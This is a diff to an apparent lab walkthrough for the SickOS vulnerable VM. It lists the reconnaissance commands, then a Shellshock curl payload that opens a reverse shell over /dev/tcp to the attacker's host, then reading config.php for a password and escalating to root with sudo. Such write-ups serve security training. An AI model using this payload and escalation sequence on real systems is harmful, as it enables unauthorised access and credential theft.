@@ -1,8 +1,39 @@
 * sudo netdiscover
   - this gets the IP address of the SickOS machine
   
-* nmap -v -sS -A -T4 <IP ADDRESS> 
+* nmap -v -sS -A -T4 <IP> 
   - This find the open and closed ports for the IP address
   - the "-sS" is for TCO SYN scan
+  - This lead to finding that port 3128 was open (squid proxy)
   
- * 
+* Nkito -h <IP> --useproxy <IP>:3128
+  - Found an outdated Apache server from 2012
+  - Found "PHP revelales sensative info"
+  - Found /cgi-bin/status is vulnerable to shellshock (Perfect!)
+  
+* dirb http://<IP> -p <IP>:3128
+  - Found /connect
+  - Found /robots.txt (Intresting)
+  - Found /cgi-bin
+  
+* http://<IP>/robots.txt
+  - Found "disallow /wolfcms"
+  - wolfcms is a blog and turns out to be a rabbit hole
+  
+* nc -lvp 1234
+  - sets up a netcat listener on port 1234
+  
+* curl -v -x http://<IP>:3128 http://<IP>/cgi-bin/status -H 'User-Agent:(){ :; }; /bin/bash -i >& /dev/tcp/<HOST IP>/1234 0>&1'
+  - This gets a reverse shell (Shellshock)
+  
+* cd /var/www/wolfcms
+
+* cat config.php
+  - found passowed john@123
+  
+* python -c "import pty;pty.spawn('/bin/bash')"
+  - This makes a stronger shell to get root
+  
+* sudo su
+
+* cd /root
